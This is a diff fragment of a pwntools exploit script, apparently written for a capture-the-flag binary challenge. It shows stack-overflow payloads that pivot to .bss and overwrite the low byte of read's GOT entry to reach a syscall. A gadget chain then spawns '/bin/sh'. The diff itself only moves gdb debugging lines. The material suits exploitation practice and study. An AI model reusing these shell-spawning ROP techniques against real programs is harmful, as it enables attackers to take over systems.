@@ -23,16 +23,21 @@ gadget2=0x4007C0
 payload=cyclic(0x10)+p64(bss_addr+0x10)+p64(read_text)
 io.send(payload)
 
+# gdb.attach(io)
+# pause()
 
 payload=cyclic(0x8)+p64(read_text)+p64(bss_addr)+p64(pop_rdi)+p64(read_got)+p64(write_to_bss)+p64(read_text) #read_got->bss
 io.send(payload)
 
 
+# gdb.attach(io)
+# pause()
+
 payload=b"/bin/sh\x00"+cyclic(0x8)+p64(bss_addr+0x600)+p64(read_text)+cyclic(0x10)+b"\x90" #low byte->'\x90'->syscall
 io.send(payload)
 
-# gdb.attach(io)
-# pause()
+gdb.attach(io)
+pause()
 
 payload=cyclic(0x10)+p64(bss_addr+0x400)+p64(read_text)+p64(gadget1)+p64(0)+p64(1)+p64(0x601820)+p64(0)+p64(0)+p64(0x6017f0)+p64(gadget2) #r12->syscall r15->edi->str_bin_sh
 io.send(payload)
